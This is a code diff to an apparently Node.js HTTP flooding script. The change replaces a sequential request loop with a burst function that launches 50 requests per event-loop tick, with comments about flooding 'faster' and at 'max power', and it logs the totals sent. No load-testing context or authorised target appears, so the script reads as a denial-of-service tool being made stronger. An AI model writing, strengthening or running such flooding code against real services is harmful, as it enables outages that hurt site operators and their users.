@@ -55,25 +55,32 @@ if (cluster.isMaster) {
       res.on('end', () => {
         successes++;
         total++;
-        requestLoop();
       });
     });
 
     req.on('error', () => {
       total++;
-      requestLoop();
     });
   }
 
-  // Start request loops after warmup
-  const MAX_LOOPS = 2000;
-  setTimeout(() => {
-    for (let i = 0; i < MAX_LOOPS; i++) {
+  // Function to spawn multiple requests at once (higher power)
+  function burstRequests() {
+    if (Date.now() > endTime) return;
+    
+    // Launch multiple requests per tick to flood faster
+    const requestsPerTick = 50; // Increase requests per tick for max power
+    for (let i = 0; i < requestsPerTick; i++) {
       requestLoop();
     }
+    setImmediate(burstRequests); // Call immediately to keep requests flowing
+  }
+
+  // Start request bursts after warmup
+  setTimeout(() => {
+    burstRequests();
   }, warmup);
 
-  // Log every 5 seconds (overwrite style)
+  // Log every 5 seconds
   const logInterval = setInterval(() => {
     process.stdout.write(`\rTOTAL SENT: ${total.toString().padEnd(12)} SUCCESSES: ${successes}`);
   }, 5000);
